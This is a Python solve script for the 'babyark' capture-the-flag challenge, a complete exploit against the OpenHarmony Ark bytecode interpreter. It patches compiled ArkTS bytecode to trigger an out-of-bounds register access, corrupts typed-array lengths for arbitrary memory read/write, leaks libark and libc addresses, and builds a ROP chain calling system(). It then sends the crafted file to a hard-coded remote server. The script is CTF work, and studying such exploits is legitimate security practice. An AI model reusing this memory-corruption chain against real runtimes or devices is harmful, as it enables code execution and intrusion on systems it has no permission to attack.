#!/usr/bin/env python3
# babyark solve: crafted ArkTS .abc -> interpreter OOB vreg -> fake LexicalEnv
# -> on-heap typed-array length corruption -> fake JSArrayBuffer/JSNativePointer
# -> arbitrary R/W -> leak libark/libc -> ROP system("cat /home/ctf/flag")
#
# Requirements: es2abc from OpenHarmony 7.0 SDK (bytecode version 24.0.0.0).
# Usage: python solve_babyark.py [host] [port] [path/to/es2abc.exe]
import os, sys, re, zlib, struct, socket, base64, subprocess, tempfile

HOST = sys.argv[1] if len(sys.argv) > 1 else "47.94.206.98"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 35025
ES2ABC = sys.argv[3] if len(sys.argv) > 3 else os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "tools", "win_ets", "es2abc.exe")

JS = r'''
function rd64(a,o){ let v=0; for(let k=7;k>=0;k--){ v = v*256 + a[o+k]; } return v; }
function wr64(a,o,v){ for(let k=0;k<8;k++){ a[o+k] = v % 256; v = Math.floor(v/256); } }
function callee(flag, obj){ let z=1; if(flag){z=obj;} return z; }
function make(){
  let cap=0;
  function victim(a, b, view, out, mg, u, mode){
    let r = callee(0, a);
    cap = mg;
    if (a.length !== 0x7fffffff) { out.push("no corrupt\n"); return 0; }
    let M=-1;
    for (let i=4096;i<30000;i++){ if (a[i]===0x42){ M=i; break; } }
    if (M<0) return 0;
    let B2 = rd64(a, M-72);
    let data = B2 + 16 - M;
    let map = 0, Aoff2 = -1;
    for (let o=4096;o<M-56;o+=8){
      if ((rd64(a,o+40) % 4294967296) === 0x1234){
        let p = rd64(a,o+32);
        let po = p - data;
        if (po >= 0 && po < M+8192){
          if ((rd64(a,po+40) % 4294967296) === 0x1234){ Aoff2=po; map=rd64(a,po); break; }
        }
      }
    }
    if (Aoff2 < 0) return 0;
    let Toff=-1;
    for (let o=4096;o<M-56;o+=8){
      if ((rd64(a,o+40) % 4294967296) === 0x2000 && (rd64(a,o+48) % 4294967296) === 0x2000){ Toff=o; break; }
    }
    if (Toff < 0) return 0;
    let origViewed = rd64(a, Toff+32);
    let origLen = rd64(a, Toff+48);
    let Naddr = data + 0x140;
    let Aaddr = data + 0x100;
    wr64(a, 0x140, 0);
    wr64(a, 0x148, data);
    wr64(a, 0x150, 0);
    wr64(a, 0x158, 0);
    wr64(a, 0x160, 0);
    wr64(a, 0x100, map);
    wr64(a, 0x108, 0);
    wr64(a, 0x110, 0);
    wr64(a, 0x118, 0);
    wr64(a, 0x120, Naddr);
    wr64(a, 0x128, 0x1000);
    wr64(a, Toff+32, Aaddr);
    a[Toff+48]=0xff; a[Toff+49]=0xff; a[Toff+50]=0xff; a[Toff+51]=0x7f; a[Toff+52]=0x07; a[Toff+53]=0; a[Toff+54]=0; a[Toff+55]=0;
    let Nabs = rd64(a, Aoff2+32);
    wr64(a, 0x148, Nabs+16);
    let deleter = rd64(u,0);
    let libark = deleter - 0x2504b40;
    wr64(a, 0x148, libark+0x2ac07f8);
    let freeaddr = rd64(u,0);
    let libc = freeaddr - 0xade30;
    wr64(a, 0x148, libc+0x20bd58);
    let envp = rd64(u,0);
    out.push("libark="+libark.toString(16)+" libc="+libc.toString(16)+" envp="+envp.toString(16)+"\n");
    if (mode === 0) { return 0; }
    let S = envp - 0x140;
    let cmd = "cat /home/ctf/flag";
    let cmdAddr = envp - 0x100;
    let popRdi = libc + 0x10c08d;
    let retG = libc + 0x10c08e;
    let systemA = libc + 0x58750;
    let exitA = libc + 0x47ba0;
    for (let i=0;i<cmd.length;i++){ wr64(a, 0x148, cmdAddr+i); u[0] = cmd.charCodeAt(i); }
    wr64(a, 0x148, cmdAddr+cmd.length); u[0] = 0;
    if (mode === 1) { return 0; }
    wr64(a, 0x148, S); wr64(u, 0, popRdi);
    wr64(a, 0x148, S+8); wr64(u, 0, cmdAddr);
    wr64(a, 0x148, S+16); wr64(u, 0, retG);
    wr64(a, 0x148, S+24); wr64(u, 0, systemA);
    wr64(a, 0x148, S+32); wr64(u, 0, exitA);
    out.push("chain ok\n");
    if (mode === 2) { return 0; }
    wr64(a, Toff+32, origViewed);
    wr64(a, Toff+48, origLen);
    out.push("restored\n");
    return 0;
  }
  return victim;
}
let v = make();
let ta = new Uint8Array(4096); ta[0]=0x41; ta[1]=0x42;
let ab = new ArrayBuffer(0x1234);
let view = new Uint8Array(ab);
let u = new Uint8Array(8192);
let m = new Uint8Array(4096); for (let i=0;i<4096;i++) m[i]=0x42;
let mb = new ArrayBuffer(8); let mf = new Float64Array(mb); let mu = new BigUint64Array(mb);
mu[0] = BigInt("0x3FF000077FFFFFFF");
let mg = mf[0];
let out = [];
let mode = 3;
v(ta, m, view, out, mg, u, mode);
print(out.join(""));
'''

# ---- minimal PandaFile parser: locate Method entities and their Code blobs ----
def uleb(d, o):
    r = s = 0
    while True:
        b = d[o]; o += 1
        r |= (b & 0x7f) << s
        if not (b & 0x80): return r, o
        s += 7

def u32(d, o): return struct.unpack_from('<I', d, o)[0]

def skip_string_inline(d, o):
    l, o = uleb(d, o)
    n, ascii_ = l >> 1, l & 1
    return o + (n + 1 if ascii_ else d.index(0, o) + 1 - o)

def get_string(d, off):
    l, o = uleb(d, off)
    n = l >> 1
    return d[o:o + n].decode('utf-8', 'replace') if l & 1 else d[o:d.index(0, o)].decode('utf-8', 'replace')

def parse_methods(d):
    file_size = u32(d, 16)
    num_classes, class_idx_off = u32(d, 28), u32(d, 32)
    methods = {}
    for i in range(num_classes):
        o = u32(d, class_idx_off + 4 * i)
        o = skip_string_inline(d, o)      # class name String
        o += 4                            # super_class_off
        _, o = uleb(d, o)                 # access_flags
        nf, o = uleb(d, o)
        nm, o = uleb(d, o)
        while d[o]:                       # class tagged data
            tag = d[o]; o += 1
            if tag == 1:
                cnt, o = uleb(d, o); o += 2 * cnt
            elif tag == 2: o += 1
            else: o += 4
        o += 1
        for _ in range(nf):               # skip fields
            o += 4
            _, o = uleb(d, o)
            while d[o]:
                t = d[o]; o += 1
                if t == 1:
                    _, o = uleb(d, o)     # sleb ok enough for small values
                else: o += 4
            o += 1
        for _ in range(nm):               # methods
            o += 4                        # class_idx, proto_idx
            name_off = u32(d, o); o += 4
            _, o = uleb(d, o)             # access_flags
            code = None
            while d[o]:
                t = d[o]; o += 1
                if t == 1: code = u32(d, o); o += 4
                elif t == 2: o += 1
                else: o += 4
            o += 1
            methods[get_string(d, name_off)] = code
    return methods

def code_blob(d, off):
    o = off
    nv, o = uleb(d, o); na, o = uleb(d, o); size, o = uleb(d, o); tries, o = uleb(d, o)
    return o, bytearray(d[o:o + size])   # (instruction offset, mutable bytes)

def main():
    work = tempfile.mkdtemp(prefix='babyark_')
    js_path = os.path.join(work, 'exp.js')
    abc_path = os.path.join(work, 'exp.abc')
    open(js_path, 'w').write(JS)
    subprocess.run([ES2ABC, '--output', abc_path, js_path], check=True)

    d = bytearray(open(abc_path, 'rb').read())
    assert d[:8] == b'PANDA\x00\x00\x00', 'bad magic'
    assert list(d[12:16]) == [24, 0, 0, 0], 'unexpected abc version: %s' % list(d[12:16])

    methods = parse_methods(d)
    # 1) callee: mov a4, v0  (MOV_V4_V4: operand = (src<<4)|dst) -> dst = 11 (victim env)
    off, code = code_blob(d, methods['#*#callee'])
    i = code.find(b'\x44\x05')
    assert i >= 0, 'callee mov not found'
    d[off + i + 1] = 0x5B                 # src=a4(5), dst=11
    # 2) victim: cap = mg   stlexvar 0,0 -> slot 1 (= ArrayLength field at T+48)
    off, code = code_blob(d, methods['#*@0*#victim'])
    s = code.find(b'\x3c\x00\xfe\x09')    # ldlexvar 0,0 ; throw.undefinedifholewithname cap
    assert s >= 0, 'victim hole-check not found'
    j = code.find(b'\x3d\x00', s + 4)     # matching stlexvar 0,0
    assert j >= 0, 'victim stlexvar not found'
    d[off + j + 1] = 0x10                 # slot=1, level=0

    file_size = u32(d, 16)
    struct.pack_into('<I', d, 8, zlib.adler32(bytes(d[12:file_size])) & 0xffffffff)
    open(abc_path, 'wb').write(bytes(d))
    print('[*] abc built: %s (%d bytes)' % (abc_path, len(d)))

    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(12)
    banner = s.recv(4096)
    print('[*]', banner.decode('latin1').strip())
    s.sendall(base64.b64encode(bytes(d)) + b'\nEOF\n')
    out = b''
    try:
        while True:
            x = s.recv(65536)
            if not x: break
            out += x
    except socket.timeout:
        pass
    text = out.decode('latin1')
    print(text)
    m = re.search(r'flag\{[^}]+\}', text)
    if m:
        print('[+] FLAG:', m.group(0))
    else:
        print('[-] flag not found')

if __name__ == '__main__':
    main()
